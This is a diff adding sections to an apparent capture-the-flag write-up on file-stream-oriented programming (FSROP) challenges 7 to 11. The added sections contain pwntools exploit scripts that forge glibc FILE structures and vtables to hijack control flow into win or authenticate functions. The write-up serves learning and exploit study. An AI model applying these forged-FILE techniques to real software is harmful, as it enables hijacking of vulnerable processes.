@@ -322,9 +322,114 @@ We'd like to overwrite the `wide_data` member of the file, in order to change co
 
 The naive plan is simple - create `FILE file` and `wide_data` by generating two separate instances of `FileStream`. \
 Then, generate `file.vtable`, making sure its entry at offset `0x38` (as this offset would be used by `fwrite`) actually overwritten to `_IO_wfile_overflow`. Also make sure the `_lock` points to a valid `NULL` value. \
-Moreover, generate `wide_data.vtable`, now having the address of `win` function within its correct offset. 
-
+Moreover, generate `wide_data.vtable`, now having the address of `win` function within its correct offset. \
 So to sum up, we would fake 2 vtables and 2 `FILE` objects. For now, none of these would overlap. 
+
+The program reads a name buffer to the heap, of up to `256` bytes long. Then it reads the full file stream, and finally uses `fwrite` of `256` bytes on the newly-opened stream. \
+Notice the vtable offset within `wide_data`, as well as the accessed method offset, differs from `file`'.s 
+
+
+```python
+p = process(BINARY)
+p.recvuntil(b'is: ')
+puts_libc_addr = int(p.readline()[:-1], 16)
+libc_base = puts_libc_addr - libc.symbols['puts']
+assert(libc_base & 0xfff == 0)
+
+p.recvuntil(b'at: ')
+name_buf_addr = int(p.recvline()[:-1], 16)
+print(f'libc_base: {hex(libc_base)} name_buf_addr: {hex(name_buf_addr)}')
+win_addr = binary.symbols['win']
+print(f'win_addr: {hex(win_addr)}')
+fake_lock_addr = 0x4040e0  # we'd use the place where flag is as the lock :)
+print(f'fake_lock_addr: {hex(fake_lock_addr)}')
+
+fake_vtable_addr = libc_base + 0x1e88a0 + 1368 - 0x38  # first component is offset to the vtables array, second to the _IO_wfile_overflow, and third to support [vptr+0x38] adjustment
+fp = FileStructure()
+fp.flags = 0xfbad8484
+fp._wide_data = name_buf_addr - 0xe0  # subtract so we would only point to the vtable
+fp._lock = fake_lock_addr
+fp.vtable = fake_vtable_addr  # sub the offset to _IO_new_file_xsputn
+fp_bytes = bytes(fp)
+print(f'fp: {fp} fp_bytes: {fp_bytes} len: {len(fp_bytes)}')
+    
+wide_vtable_addr = name_buf_addr + 8
+
+name_buf = b''
+name_buf += struct.pack('<Q', wide_vtable_addr - 0x68)
+name_buf += struct.pack('<Q', win_addr)
+
+p.recvuntil(b'your name.\n')
+p.send(name_buf)
+
+p.recvuntil(b'to the FILE struct.\n')
+p.send(fp_bytes)
+
+p.interactive()
+```
+
+## Challenge 8
+
+Similar to before, but this time we're not given an extra input buffer. \
+This means we have to store all tables, pointers, fake `wide_data`, within the file stream itself. 
+
+```python
+p = process(BINARY)
+p.recvuntil(b'is: ')
+puts_libc_addr = int(p.readline()[:-1], 16)
+libc_base = puts_libc_addr - libc.symbols['puts']
+assert(libc_base & 0xfff == 0)
+
+p.recvuntil(b'to: ')
+stream_addr = int(p.recvline()[:-1], 16)
+
+print(f'libc_base: {hex(libc_base)} stream_addr: {hex(stream_addr)}')
+win_addr = binary.symbols['win']
+print(f'win_addr: {hex(win_addr)}')
+fake_lock_addr = 0x4040e0  # we'd use the place where flag is as the lock :)
+print(f'fake_lock_addr: {hex(fake_lock_addr)}')
+
+fake_vtable_addr = libc_base + 0x1e88a0 + 1368 - 0x38  # first component is offset to the vtables array, second to the _IO_wfile_overflow, and third to support [vptr+0x38] adjustment
+fp = FileStructure()
+fp.flags = 0xfbad8484
+fp._IO_read_ptr = stream_addr - 0xe0 - 0x68 + 224 + 16  # fake vtable
+fp._IO_read_end = win_addr
+fp._wide_data = stream_addr - 0xe0 + 8 # subtract so we would only point to the vtable
+fp._lock = fake_lock_addr
+fp.vtable = fake_vtable_addr  # sub the offset to _IO_new_file_xsputn
+fp_bytes = bytes(fp)
+print(f'fp: {fp} fp_bytes: {fp_bytes} len: {len(fp_bytes)}')
+p.send(fp_bytes)
+```
+
+## Challenge 9
+
+Now we overwrite a builtin file stream (`stdout`). \
+Moreover, there's no `win` method, but the binary is partial RELRO. This means I can gain control flow by overwriting some GOT entry to my desire, such as `chmod`. 
+Notice - all vtable methods are being called having `fp` as their first argument.
+
+By further reading, I've seen theres an `authenticate` method. By adjusting the symbol resolving to this method, the flag was granted in a similar manner to challenge 8.
+
+The main takeaway from this challenge is that `authenticate` calls `chmod`, and the printing doesn't occurs. \
+This is due to `stdout` being completely corrupted. 
+
+## Challenge 10
+
+Similar to before, but now `authenticate` verifies `fp` (which is being used as the first parameter of the virtual call) points to `"password"` string. \
+I've adjusted abit the exploit, and set the string within the `flags` argument.
+
+```python
+fp.flags = 0x64726f7773736170
+fp._IO_read_ptr = 0
+fp._IO_read_end = stream_addr - 0xe0 - 0x68 + 224 + 24  # fake vtable
+fp._IO_read_base = win_addr
+```
+
+Rest of the exploit remained the same. 
+
+## Challenge 11
+
+
 
 
 [angry-fsrop]: https://blog.kylebot.net/2022/10/22/angry-FSROP
